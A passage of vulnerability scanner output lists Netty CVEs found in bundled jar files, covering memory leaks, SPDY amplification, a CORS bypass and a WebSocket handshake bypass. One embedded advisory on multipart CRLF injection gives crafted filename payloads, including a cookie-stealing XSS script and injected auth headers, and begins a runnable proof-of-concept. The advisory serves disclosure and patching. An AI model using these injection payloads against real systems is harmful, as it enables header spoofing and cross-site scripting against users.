│     │      │                   Service.
│     │      │                   
│     │      │                   ### Details
│     │      │                   Inside `io.netty.handler.codec.dns.AbstractDnsRecord`, the parsed domain name
│     │      │                   string is passed to `IDN.toASCII(name)`. If the domain name contains
│     │      │                   characters that violate IDNA rules, `IDN.toASCII` throws an
│     │      │                   `IllegalArgumentException`.
│     │      │                   Because this exception occurs inside the constructor before the `DnsRecord`
│     │      │                   instance can assign the buffer to its content field for later release, the
│     │      │                   ByteBuf whose reference count was incremented (or newly allocated) is never
│     │      │                   released, resulting in a direct memory leak.
│     │      │                   There are several places where variants of this leak happen:
│     │      │                   -
│     │      │                   `io.netty.handler.codec.dns.DefaultDnsRecordDecoder#decodeRecord(java.lang.Str
│     │      │                   ing, io.netty.handler.codec.dns.DnsRecordType, int, long,
│     │      │                   io.netty.buffer.ByteBuf, int, int)` invokes `in.retainedDuplicate()` or
│     │      │                   creates a new buffer `out` when constructing `DefaultDnsRawRecord`
│     │      │                   - `io.netty.handler.codec.dns.DnsCodecUtil#decompressDomainName` allocates a
│     │      │                   new `ByteBuf` and passes it to `encodeDomainName()`. If the decompressed
│     │      │                   domain name contains a null byte (`\0`), `encodeDomainName()` throws an
│     │      │                   `IllegalArgumentException`, leaking the newly allocated buffer.
│     │      │                   ### Impact
│     │      │                   Resource Exhaustion. Any application utilizing Netty's DnsRecordDecoder (such
│     │      │                   as DnsNameResolver or custom DNS servers) is vulnerable. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L 
│     │      │                         ╰ V3Score : 5.3 
│     │      ├ References       ╭ [0]: https://github.com/netty/netty 
│     │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655
│     │      │                  │      c9003b 
│     │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52af
│     │      │                  │      f680c6 
│     │      │                  ├ [3]: https://github.com/netty/netty/pull/17063 
│     │      │                  ├ [4]: https://github.com/netty/netty/pull/17065 
│     │      │                  ├ [5]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │      │                  ├ [6]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │      │                  ╰ [7]: https://github.com/netty/netty/security/advisories/GHSA-mfg7-5gfp-c4w3 
│     │      ├ PublishedDate   : 2026-07-24T16:52:50Z 
│     │      ╰ LastModifiedDate: 2026-07-24T16:52:50Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2026-55831 
│     │      ├ VendorIDs        ─ [0]: GHSA-6jqx-86gh-f27w 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
│     │      │                  ╰ UID : 3fc77ba685baead2 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-55831 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:c104ac95495b31033556908844bed69dfa839ed1326e165ac974bbaf6be6e35c 
│     │      ├ Title           : Netty is a network application framework for development of protocol s ... 
│     │      ├ Description     : Netty is a network application framework for development of protocol servers
│     │      │                   and clients. Prior to 4.1.136.Final and 4.2.16.Final, Netty's SPDY SETTINGS
│     │      │                   decoder accepts a peer-declared SETTINGS entry count up to the 24-bit
│     │      │                   frame-length limit and materializes every unique setting ID in
│     │      │                   `DefaultSpdySettingsFrame`, allowing a remote SPDY/3.1 peer to send a
│     │      │                   syntactically valid roughly 2 MiB SETTINGS frame that creates 262144 map
│     │      │                   entries and amplifies network input into heap growth and ordered-map insertion
│     │      │                    work. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-400 
│     │      │                  ╰ [1]: CWE-770 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                         ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://github.com/netty/netty 
│     │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655
│     │      │                  │      c9003b 
│     │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52af
│     │      │                  │      f680c6 
│     │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHSA-6jqx-86gh-f27w 
│     │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-55831 
│     │      ├ PublishedDate   : 2026-07-21T00:17:35.383Z 
│     │      ╰ LastModifiedDate: 2026-07-23T15:17:16.78Z 
│     ├ [6]  ╭ VulnerabilityID : CVE-2026-55833 
│     │      ├ VendorIDs        ─ [0]: GHSA-mvh2-crg5-v77c 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
│     │      │                  ╰ UID : 3fc77ba685baead2 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-55833 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:ac0968511d94a4abed16a2596fee5c901dc9e4b8ae1b007333e6ac0c68a863f3 
│     │      ├ Title           : Netty is a network application framework for development of protocol s ... 
│     │      ├ Description     : Netty is a network application framework for development of protocol servers
│     │      │                   and clients. Prior to 4.1.136.Final and 4.2.16.Final, Netty SPDY header
│     │      │                   decoding continues inflating zlib-compressed header blocks after the raw
│     │      │                   header parser has exceeded `maxHeaderSize` and marked the frame truncated in
│     │      │                   `SpdyFrameCodec`, allowing a remote peer to send a small compressed `HEADERS`
│     │      │                   block that expands into much larger raw header data and causes
│     │      │                   compression-amplified CPU and allocation churn. This issue is fixed in
│     │      │                   versions 4.1.136.Final and 4.2.16.Final. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-400 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                         ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://github.com/netty/netty 
│     │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655
│     │      │                  │      c9003b 
│     │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52af
│     │      │                  │      f680c6 
│     │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHSA-mvh2-crg5-v77c 
│     │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-55833 
│     │      ├ PublishedDate   : 2026-07-21T00:17:35.537Z 
│     │      ╰ LastModifiedDate: 2026-07-23T13:34:45.383Z 
│     ├ [7]  ╭ VulnerabilityID : CVE-2026-56745 
│     │      ├ VendorIDs        ─ [0]: GHSA-jppx-w49h-x2qq 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
│     │      │                  ╰ UID : 3fc77ba685baead2 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56745 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:3cf137d7edc53d3f8bfb07e0f89ace85f596ed10712c33d6f86586a600758bba 
│     │      ├ Title           : Netty is a network application framework for development of protocol s ... 
│     │      ├ Description     : Netty is a network application framework for development of protocol servers
│     │      │                   and clients. In versions 4.2.0.Final through 4.2.15.Final and 4.1.0.Final
│     │      │                   through 4.1.135.Final, the `SpdyHttpDecoder` handler in Netty's SPDY-to-HTTP
│     │      │                   codec allocates a pooled `ByteBuf` when processing a client-initiated
│     │      │                   `SYN_STREAM` frame with `FLAG_FIN=0` and stores the partially constructed
│     │      │                   `FullHttpRequest` in `messageMap`; when the remote peer sends `RST_STREAM` for
│     │      │                    that stream or the accumulated content exceeds `maxContentLength`, the
│     │      │                   decoder removes the entry but does not release the pooled `ByteBuf`, causing
│     │      │                   native memory exhaustion. This issue is fixed in versions 4.1.136.Final and
│     │      │                   4.2.16.Final. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-400 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/
│     │      │                         │            SA:N 
│     │      │                         ╰ V40Score : 8.7 
│     │      ├ References       ╭ [0]: https://github.com/netty/netty 
│     │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655
│     │      │                  │      c9003b 
│     │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52af
│     │      │                  │      f680c6 
│     │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHSA-jppx-w49h-x2qq 
│     │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-56745 
│     │      ├ PublishedDate   : 2026-07-21T22:17:14.5Z 
│     │      ╰ LastModifiedDate: 2026-07-22T20:35:40.827Z 
│     ├ [8]  ╭ VulnerabilityID : CVE-2026-56746 
│     │      ├ VendorIDs        ─ [0]: GHSA-6cqp-g7gg-8hr5 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
│     │      │                  ╰ UID : 3fc77ba685baead2 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56746 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:bcf9f4837802b490917a62b80060d851d1ce14da0806d8a426bf07d2bed6f0ca 
│     │      ├ Title           : Netty is a network application framework for development of protocol s ... 
│     │      ├ Description     : Netty is a network application framework for development of protocol servers
│     │      │                   and clients. Versions 4.2.0.Final through 4.2.15.Final and 4.1.0.Final through
│     │      │                    4.1.135.Final, are vulnerable to security control bypass during the origin
│     │      │                   evaluation process. CorsHandler provides a shortCircuit() configuration
│     │      │                   designed to reject unauthorized cross-origin requests immediately, acting as a
│     │      │                    security control before requests reach the application. However, due to a
│     │      │                   logical operator error in the origin evaluation process, this protection can
│     │      │                   be entirely bypassed. An attacker can bypass the short-circuit mechanism by
│     │      │                   sending a request with an Origin: null header. This failure forwards
│     │      │                   unauthorized requests to the backend application, bypassing intended access
│     │      │                   controls. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ CweIDs           ─ [0]: CWE-284 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N 
│     │      │                         ╰ V3Score : 6.5 
│     │      ├ References       ╭ [0]: https://github.com/netty/netty 
│     │      │                  ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │      │                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │      │                  ├ [3]: https://github.com/netty/netty/security/advisories/GHSA-6cqp-g7gg-8hr5 
│     │      │                  ╰ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-56746 
│     │      ├ PublishedDate   : 2026-07-21T22:17:14.667Z 
│     │      ╰ LastModifiedDate: 2026-07-22T20:35:40.827Z 
│     ├ [9]  ╭ VulnerabilityID : CVE-2026-59898 
│     │      ├ VendorIDs        ─ [0]: GHSA-4mp9-239f-g9hg 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
│     │      │                  ╰ UID : 3fc77ba685baead2 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59898 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:2166ad87af5904d4514208846237509a5ed8c9883c1e294569d9471e770b9d6a 
│     │      ├ Title           : Netty: WebSockets V07/V08 handshaker missing Connection/Upgrade validation 
│     │      ├ Description     : ## Summary
│     │      │                   An attacker can force WebSocket upgrade via the lax V07 (or V08) handshaker by
│     │      │                    sending `Sec-WebSocket-Version: 7` and omitting `Connection: Upgrade` /
│     │      │                   `Upgrade: websocket` headers, completing a protocol switch that a proxy would
│     │      │                   not recognize as an Upgrade request and enabling HTTP request smuggling /
│     │      │                   protocol-confusion attacks. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/
│     │      │                         │            SA:N 
│     │      │                         ╰ V40Score : 6.3 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHSA-4mp9-239f-g9hg 
│     ├ [10] ╭ VulnerabilityID : CVE-2026-59899 
│     │      ├ VendorIDs        ─ [0]: GHSA-q4f6-jm68-57ww 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
│     │      │                  ╰ UID : 3fc77ba685baead2 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59899 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:e8d5761d1af1ec4486e3e49f2c36331af5da584b5c948e0f4e8c0bfe0cb7530f 
│     │      ├ Title           : Netty: [HttpContentEncoder] Unbounded Per-Connection Queue Growth via HTTP/1.1
│     │      │                    Pipelining Leads to Denial of Service 
│     │      ├ Description     : ### Impact
│     │      │                   `HttpContentEncoder` (the superclass of the production handler
│     │      │                   `HttpContentCompressor`) maintains a per-channel `ArrayDeque<CharSequence>`
│     │      │                   named `acceptEncodingQueue` that accumulates attacker-controlled data without
│     │      │                   any size limit. The queue is filled on the I/O thread for every inbound HTTP
│     │      │                   request and drained only when the application later writes a non-1xx response.
│     │      │                    This creates a resource exhaustion vulnerability when an attacker exploits
│     │      │                   HTTP/1.1 pipelining to flood the connection with requests faster than the
│     │      │                   application produces responses. 
│     │      ├ Severity        : MEDIUM 
│     │      ├ VendorSeverity   ─ ghsa: 2 
│     │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/
│     │      │                         │            SA:N 
│     │      │                         ╰ V40Score : 6.9 
│     │      ╰ References       ╭ [0]: https://github.com/netty/netty 
│     │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.136.Final 
│     │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.16.Final 
│     │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHSA-q4f6-jm68-57ww 
│     ├ [11] ╭ VulnerabilityID : CVE-2026-59921 
│     │      ├ VendorIDs        ─ [0]: GHSA-gcjf-9mgh-3p7g 
│     │      ├ PkgName         : io.netty:netty-codec-http 
│     │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
│     │      │                  ╰ UID : 3fc77ba685baead2 
│     │      ├ InstalledVersion: 4.2.15.Final 
│     │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59921 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Maven 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven 
│     │      ├ Fingerprint     : sha256:ea922e122b989b63d0499c3075b9c096131bad4278ea07d6bb5f84a725db1801 
│     │      ├ Title           : Netty: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder 
│     │      ├ Description     : # Security Vulnerability Report: CRLF Injection via Multipart Filename in
│     │      │                   Netty HttpPostRequestEncoder
│     │      │                   
│     │      │                   ## 1. Vulnerability Summary
│     │      │                   | Field | Value |
│     │      │                   |-------|-------|
│     │      │                   | **Product** | Netty |
│     │      │                   | **Version** | 4.2.12.Final (and all prior versions with codec-http
│     │      │                   multipart) |
│     │      │                   | **Component** |
│     │      │                   `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` |
│     │      │                   | **Vulnerability Type** | CWE-93: Improper Neutralization of CRLF Sequences /
│     │      │                    CWE-113: HTTP Response Splitting |
│     │      │                   | **Impact** | MIME Header Injection / Content-Type Spoofing / XSS via
│     │      │                   Content-Disposition |
│     │      │                   | **CVSS 3.1 Score** | **8.1 (High)** |
│     │      │                   | **CVSS 3.1 Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` |
│     │      │                   | **Attack Vector** | Network |
│     │      │                   | **Attack Complexity** | Low |
│     │      │                   | **Privileges Required** | Low (attacker must be able to upload files with
│     │      │                   controlled filenames) |
│     │      │                   | **User Interaction** | None |
│     │      │                   | **Scope** | Unchanged |
│     │      │                   | **Confidentiality Impact** | High |
│     │      │                   | **Integrity Impact** | High |
│     │      │                   | **Availability Impact** | None |
│     │      │                   ## 2. Affected Components
│     │      │                   The following classes in the `codec-http` module are affected:
│     │      │                   - `io.netty.handler.codec.http.multipart.HttpPostRequestEncoder` — directly
│     │      │                   concatenates unvalidated filename/name into `Content-Disposition` MIME headers
│     │      │                    (lines 519, 633, 674, 682, 686-688)
│     │      │                   - `io.netty.handler.codec.http.multipart.DiskFileUpload` — `setFilename()`
│     │      │                   only checks null (line 78)
│     │      │                   - `io.netty.handler.codec.http.multipart.MemoryFileUpload` — `setFilename()`
│     │      │                   only checks null (line 60)
│     │      │                   - `io.netty.handler.codec.http.multipart.MixedFileUpload` — `setFilename()`
│     │      │                   delegates without validation (line 62)
│     │      │                   ## 3. Vulnerability Description
│     │      │                   Netty's `HttpPostRequestEncoder` constructs multipart HTTP request bodies by
│     │      │                   directly concatenating user-supplied filenames and field names into
│     │      │                   `Content-Disposition` MIME headers **without validating or sanitizing CRLF
│     │      │                   characters** (`\r\n`). Since MIME headers are delimited by CRLF, an attacker
│     │      │                   who controls the filename can inject arbitrary MIME headers into the multipart
│     │      │                    body part.
│     │      │                   ### Root Cause
│     │      │                   In `HttpPostRequestEncoder.java`, multiple code paths directly embed
│     │      │                   `fileUpload.getFilename()` into header strings:
│     │      │                   ```java
│     │      │                   // Line 674 (attachment mode):
│     │      │                   internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ": "
│     │      │                       + HttpHeaderValues.ATTACHMENT + "; "
│     │      │                       + HttpHeaderValues.FILENAME + "=\"" + fileUpload.getFilename() +
│     │      │                   "\"\r\n");
│     │      │                   //                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO
│     │      │                   VALIDATION
│     │      │                   // Lines 686-688 (form-data mode):
│     │      │                   internal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + ": " +
│     │      │                   HttpHeaderValues.FORM_DATA + "; "
│     │      │                       + HttpHeaderValues.NAME + "=\"" + fileUpload.getName() + "\"; "
│     │      │                   // Line 519 (attribute name):
│     │      │                       + HttpHeaderValues.NAME + "=\"" + attribute.getName() + "\"\r\n");
│     │      │                   //                                    ^^^^^^^^^^^^^^^^^ NO VALIDATION
│     │      │                   ```
│     │      │                   The `setFilename()` method in all `FileUpload` implementations only checks for
│     │      │                    null:
│     │      │                   // DiskFileUpload.java:77-79
│     │      │                   public void setFilename(String filename) {
│     │      │                       this.filename = ObjectUtil.checkNotNull(filename, "filename");
│     │      │                       // NO CRLF VALIDATION
│     │      │                   }
│     │      │                   ### Comparison with Similar Fixed CVEs
│     │      │                   This vulnerability follows the same pattern as:
│     │      │                   | CVE | Component | Fix |
│     │      │                   |-----|-----------|-----|
│     │      │                   | **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder — SMTP command injection |
│     │      │                   Added CRLF validation in `SmtpUtils.validateSMTPParameters()` |
│     │      │                   | **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder — CRLF in URI | Added
│     │      │                   `HttpUtil.validateRequestLineTokens()` |
│     │      │                   The multipart encoder has **no equivalent validation** for filenames or field
│     │      │                   names.
│     │      │                   ## 4. Exploitability Prerequisites
│     │      │                   This vulnerability is exploitable when:
│     │      │                   1. The application uses Netty's `HttpPostRequestEncoder` to construct
│     │      │                   multipart HTTP requests
│     │      │                   2. The filename of an uploaded file is derived from user-controlled input
│     │      │                   3. The application does **not** perform its own CRLF sanitization on
│     │      │                   filenames
│     │      │                   **Common affected patterns**:
│     │      │                   - File upload proxies that forward user-supplied filenames
│     │      │                   - API gateways that construct multipart requests from incoming parameters
│     │      │                   - Microservice communication that passes filenames between services
│     │      │                   - Testing/automation frameworks that use Netty HTTP client with user-defined
│     │      │                   ## 5. Attack Scenarios
│     │      │                   ### Scenario 1: Content-Type Override via Filename Injection
│     │      │                   An attacker uploads a file with a crafted filename to override the
│     │      │                   Content-Type of the multipart body part, potentially enabling stored XSS:
│     │      │                   String maliciousFilename = "photo.jpg\"\r\nContent-Type:
│     │      │                   text/html\r\n\r\n<script>alert(document.cookie)</script>\r\n--";
│     │      │                   DiskFileUpload upload = new DiskFileUpload(
│     │      │                       "avatar", maliciousFilename, "image/jpeg", "binary", UTF_8, fileSize);
│     │      │                   **Wire format:**
│     │      │                   --boundary
│     │      │                   content-disposition: form-data; name="avatar"; filename="photo.jpg"
│     │      │                   Content-Type: text/html                    <-- INJECTED: overrides image/jpeg
│     │      │                   <script>alert(document.cookie)</script>    <-- INJECTED: XSS payload
│     │      │                   --"
│     │      │                   content-type: image/jpeg                   <-- Original (now ignored by many
│     │      │                   parsers)
│     │      │                   ...
│     │      │                   If the receiving server parses the **first** `Content-Type`, the file is
│     │      │                   treated as HTML instead of JPEG, enabling XSS when the file is served back.
│     │      │                   ### Scenario 2: Arbitrary MIME Header Injection
│     │      │                   String filename = "doc.pdf\"\r\nX-Custom-Auth:
│     │      │                   admin-token-12345\r\nX-Bypass-Check: true";
│     │      │                   Injects arbitrary headers into the multipart body part that may be processed
│     │      │                   by downstream middleware or application logic.
│     │      │                   ### Scenario 3: Multipart Boundary Confusion
│     │      │                   String filename = "file.txt\"\r\n\r\nmalicious body
│     │      │                   content\r\n--boundary\r\nContent-Disposition: form-data; name=\"secret";
│     │      │                   By injecting a new boundary delimiter, the attacker can:
│     │      │                   - Terminate the current body part prematurely
│     │      │                   - Start a new body part with a different field name
│     │      │                   - Override form fields processed by the server
│     │      │                   ## 6. Proof of Concept
│     │      │                   ### Full Runnable PoC Source Code (MultipartFilenameInjectionPoC.java)
│     │      │                   import io.netty.buffer.ByteBuf;
│     │      │                   import io.netty.buffer.Unpooled;
│     │      │                   import io.netty.handler.codec.http.*;
│     │      │                   import io.netty.handler.codec.http.multipart.*;
│     │      │                   import java.io.File;
│     │      │                   import java.io.FileWriter;
│     │      │                   import java.nio.charset.StandardCharsets;
│     │      │                   /**
│     │      │                    * PoC: HTTP Multipart Content-Disposition Header Injection via Filename
│     │      │                    *
│     │      │                    * Demonstrates that HttpPostRequestEncoder does not validate filenames
│     │      │                    * for CRLF characters, allowing injection of arbitrary MIME headers
│     │      │                    * into multipart form data.
│     │      │                    */
│     │      │                   public class MultipartFilenameInjectionPoC {
│     │      │                       public static void main(String[] args) throws Exception {
│     │      │                           System.out.println("=== Netty Multipart Filename CRLF Injection PoC
│     │      │                   ===\n");
│     │      │                           testFilenameInjection();
│     │      │                           System.out.println("\n=== PoC Complete ===");
│     │      │                       }
│     │      │                       static void testFilenameInjection() throws Exception {
│     │      │                           System.out.println("[TEST 1] Filename CRLF Injection in
│     │      │                   Content-Disposition");
│     │      │                          
│     │      │                   System.out.println("-------------------------------------------------------");
│     │      │                           // Create a temporary file for upload
│     │      │                           File tempFile = File.createTempFile("test", ".txt");
